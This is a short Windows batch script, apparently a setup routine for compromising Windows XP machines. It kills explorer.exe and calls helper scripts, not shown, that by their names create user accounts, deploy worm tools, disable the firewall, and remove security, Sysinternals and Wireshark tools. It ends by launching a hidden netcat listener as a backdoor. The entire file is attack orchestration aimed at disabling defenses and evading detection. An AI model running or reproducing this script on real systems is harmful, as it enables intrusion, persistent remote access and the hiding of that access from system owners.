@echo off
::setup scripting for Windows Xp tools

taskkill /IM explorer.exe /F
call createusers.bat
call wormtools.bat
call disablefirewall.bat
call removekillers.bat
call removenetworktools.bat
call removeSYSinternals.bat
call removewireshark.bat
call renameclinetworktools.bat
start /min netcatlistener.bat